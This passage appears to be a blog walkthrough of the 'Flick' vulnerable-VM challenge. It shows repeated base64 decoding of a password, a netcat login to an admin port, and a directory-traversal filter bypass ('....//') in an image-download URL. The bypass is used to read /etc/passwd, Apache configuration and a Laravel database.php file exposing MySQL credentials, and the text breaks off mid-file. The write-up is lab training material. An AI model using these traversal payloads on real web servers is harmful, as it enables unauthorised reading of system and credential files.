</span><span class='line'><span class="nv">Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0</span><span class="o">=</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>More base64&hellip; OK, decode again</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=&quot;</span> <span class="p">|</span> base64 -d
</span><span class='line'><span class="nv">Vm0wd2QyUXlVWGxWV0d4WFlUSm9WMVl3Wkc5V2JGbDNXa1pPVlUxV2NIcFhhMXBQVjBaYWMySkVUbGhoTVVwVVZtcEdTMk15U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmJFcEpWbTEwYzJGV1NuUmhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpXU2twV2JURXdZekpHVjFOdVVtaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVsUkdXbGt3WkRSVk1rcFhVMnR3VjJKVVJYZFpWRVpyVTBaT2NtRkdXbWxTYTNCWFZtMTBWMlF5VW5OWGJHUllZbGhTV0ZSV1pGTmxiRmw1VFZSU1ZrMXJjRWxhU0hCSFZqSkZlVlZZWkZwbGEzQklWV3BHVDJSV1VuUmpSbEpUVmxoQ1dsWnJXbGRoTVZWNVZXeGthbEp0YUhOVmFrNVRWMVpXY1ZKcmRGUldiRm93V2xWb2ExWXdNVVZTYkdSYVRVWmFlbFpxU2t0V1ZrWlpZVVprVTFKWVFrbFdWM0JIVkRKU1YxZHVUbFJpVjNoVVZGY3hiMWRzV1hoYVJGSnBUV3RzTkZkclZtdFdiVXB5WTBac1dtSkdXbWhaTVZwelkyeGtkRkp0ZUZkaVZrbzFWbXBLTkZReFdsaFRiRnBZVmtWd1dGbHNhRU5YUmxweFVtdDBhazFyTlVsWlZWcHJZVWRGZUdOSGFGaGlSbkJvVmtSS1QyTXlUa1phUjJoVFRXNW9kbFpHVm05Uk1XUlhWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hXYXpWSFZqSjRVMWR0U2toaFJsSlhUVVp3VkZacVJtdGtWbkJHVGxaT2FWSnRPVE5XYTFwaFZURkZlRmRzYUZSaE1YQnhWV3hrYjFkR1VsaE9WVTVZVW14d2VGVnRkREJoYXpGeVRsVm9XbFpXY0hKWlZXUkdaV3hHY21KR1pGZFNWWEJ2VmpGYWExVXhXWGhVYmxaVllrWktjRlZxUmt0V1ZscEhWV3RLYTAxRVJsTlZSbEYzVUZFOVBRPT0</span><span class="o">=</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://d2tq98mqfjyz2l.cloudfront.net/image_cache/1308021750174814.gif" alt="" /> Turns out you have to keep decoding the base64 about 13 more times until you end up with this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">echo</span> <span class="s2">&quot;dGFidXBKaWV2YXM4S25vag==&quot;</span> <span class="p">|</span> base64 -d
</span><span class='line'>tabupJievas8Knoj
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Which just so happens to be the password for the application runnning on port 8881</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 192.168.0.106 8881
</span><span class='line'>Welcome to the admin server. A correct password will <span class="s1">&#39;flick&#39;</span> the switch and open a new door:
</span><span class='line'>&gt; tabupJievas8Knoj
</span><span class='line'>OK: tabupJievas8Knoj
</span><span class='line'>
</span><span class='line'>Accepted! The door should be open now :poolparty:
</span><span class='line'>
</span><span class='line'>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Another NMAP scan now indicates that port 80 is open. Let us take a look.</p>

<hr />

<h2>The Internet is Made of Cats</h2>

<p>Looking at the site hosted by the website kinda stops me in my tracks. KITTENS !!! YAY !!!</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png" alt="flick_001" /></a></p>

<p>You can log in with the credentials of demo:demo123 on the login page to give you the ability to upload images (note here, it allows you to upload absolutely anything).</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png" alt="flick_002" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png" alt="flick_003" /></a></p>

<p>I figured that the upload feature was the vulnerability and worked on uploading PHP shells etc, but I was not able to get any PHP to execute. Maybe it&rsquo;s not the <strong>up</strong>load feature that&rsquo;s useful, maybe it&rsquo;s the <strong>down</strong>load feature ? The download feature will present you with a file, called image.jpg, of the file you&rsquo;re requesting. Turns out you can request any file on the filesystem if you bypass the directory traversal filter (same way as with Hell, using &hellip;.// instead of ../). Requesting the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//etc/passwd
</span></code></pre></td></tr></table></div></figure>


<p>results in an &ldquo;image.jpg&rdquo; file which needs to be catted to view the contents of /etc/passwd as text.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# mv image.jpg flick_passwd
</span><span class='line'>root@pwk:~# cat flick_passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
</span><span class='line'>dean:x:1001:1001:,,,:/home/dean:/bin/bash
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Hmm, with this I can request pretty much anything, right ? If a folder or file exists, it gives me a download dialog, if the file does not exist, it gives me an error. This is blind filesystem traversal.</p>

<p><img src="http://media.tumblr.com/tumblr_lg3vooHJ7B1qac925.gif" alt="" /></p>

<p>Firstly I needed to find out the DocumentRoot from the Apache</p>

<p>So, I figured I wanted some credentials - and started by trying to get MySQL credentials from the application. A bit of googling determined that the application was <a href="http://getbootstrap.com/">Bootstrap</a> on top of <a href="https://github.com/laravel/laravel">Laravel</a>.  Firstly I requested the following URL to get the apache configuration.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//etc/apache2/apache.conf
</span></code></pre></td></tr></table></div></figure>


<p>which pointed me towards the sites-enabled folder. A bit of googling told me that sites-enabled is just full of symlinks to files in sites-available, so I grabbed the default file</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//etc/apache2/sites-available/default
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;VirtualHost</span> <span class="err">*:80</span><span class="nt">&gt;</span>
</span><span class='line'>  ServerAdmin webmaster@localhost
</span><span class='line'>
</span><span class='line'>  DocumentRoot /var/www/flick_photos/public
</span><span class='line'>  <span class="nt">&lt;Directory</span> <span class="nt">/&gt;</span>
</span><span class='line'>      Options FollowSymLinks
</span><span class='line'>      AllowOverride None
</span><span class='line'>  <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>  <span class="nt">&lt;Directory</span> <span class="err">/var/www/flick_photos/public</span><span class="nt">&gt;</span>
</span><span class='line'>      Options Indexes FollowSymLinks MultiViews
</span><span class='line'>      AllowOverride All
</span><span class='line'>      Order allow,deny
</span><span class='line'>      allow from all
</span><span class='line'>  <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>
</span><span class='line'>  ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
</span><span class='line'>  <span class="nt">&lt;Directory</span> <span class="err">&quot;/usr/lib/cgi-bin&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      AllowOverride None
</span><span class='line'>      Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
</span><span class='line'>      Order allow,deny
</span><span class='line'>      Allow from all
</span><span class='line'>  <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>
</span><span class='line'>  ErrorLog ${APACHE_LOG_DIR}/error.log
</span><span class='line'>
</span><span class='line'>  # Possible values include: debug, info, notice, warn, error, crit,
</span><span class='line'>  # alert, emerg.
</span><span class='line'>  LogLevel warn
</span><span class='line'>
</span><span class='line'>  CustomLog ${APACHE_LOG_DIR}/access.log combined
</span><span class='line'>
</span><span class='line'>    Alias /doc/ &quot;/usr/share/doc/&quot;
</span><span class='line'>    <span class="nt">&lt;Directory</span> <span class="err">&quot;/usr/share/doc/&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>        Options Indexes MultiViews FollowSymLinks
</span><span class='line'>        AllowOverride None
</span><span class='line'>        Order deny,allow
</span><span class='line'>        Deny from all
</span><span class='line'>        Allow from 127.0.0.0/255.0.0.0 ::1/128
</span><span class='line'>    <span class="nt">&lt;/Directory&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;/VirtualHost&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Our DocumentRoot is /var/www/flick_photos/public, so we now know our base path. Using the Laravel github repo as a directional aid, I found out the database config file is located in app/config/database.php, so</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://192.168.0.106/image/download?filename<span class="o">=</span>....//....//....//....//....//var/www/flick_photos/app/config/database.php
</span></code></pre></td></tr></table></div></figure>


<p>catting this image.jpg file does indeed show us credentials for MySQL, but there&rsquo;s something more interesting</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | PDO Fetch Style</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | By default, database results will be returned as instances of the PHP</span>
</span><span class='line'><span class="cm"> | stdClass object; however, you may desire to retrieve records in an</span>
</span><span class='line'><span class="cm"> | array format for simplicity. Here you can tweak the fetch style.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;fetch&#39;</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_CLASS</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Default Database Connection Name</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | Here you may specify which of the database connections below you wish</span>
</span><span class='line'><span class="cm"> | to use as your default connection for all database work. Of course</span>
</span><span class='line'><span class="cm"> | you may use many connections at once using the Database library.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved</span>
</span><span class='line'>  <span class="c1">// on to the new and improved MySQL database. So, I will just comment out this as it is</span>
</span><span class='line'>  <span class="c1">// no longer in use</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//&#39;default&#39; =&gt; &#39;sqlite&#39;,</span>
</span><span class='line'>  <span class="s1">&#39;default&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;mysql&#39;</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/*</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> | Database Connections</span>
</span><span class='line'><span class="cm"> |--------------------------------------------------------------------------</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | Here are each of the database connections setup for your application.</span>
</span><span class='line'><span class="cm"> | Of course, examples of configuring each database platform that is</span>
</span><span class='line'><span class="cm"> | supported by Laravel is shown below to make development simple.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> | All database work in Laravel is done through the PHP PDO facilities</span>
</span><span class='line'><span class="cm"> | so make sure you have the driver for your particular database of</span>
</span><span class='line'><span class="cm"> | choice installed on your machine before you begin development.</span>
</span><span class='line'><span class="cm"> |</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'>  <span class="s1">&#39;connections&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;sqlite&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;sqlite&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span> <span class="o">=&gt;</span> <span class="nx">__DIR__</span><span class="o">.</span><span class="s1">&#39;/../database/production.sqlite&#39;</span><span class="p">,</span> <span class="c1">// OLD DATABASE NO LONGER IN USE!</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;mysql&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;mysql&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;host&#39;</span>      <span class="o">=&gt;</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;database&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;flick&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;username&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;flick&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;password&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;resuddecNeydmar3&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;charset&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;utf8&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;collation&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;utf8_unicode_ci&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="s1">&#39;prefix&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">),</span>
</span><span class='line'>
</span><span class='line'>      <span class="s1">&#39;pgsql&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span><span class='line'>          <span class="s1">&#39;driver&#39;</span>   <span class="o">=&gt;</span> <span class="s1">&#39;pgsql&#39;</span><span class="p">,</span>
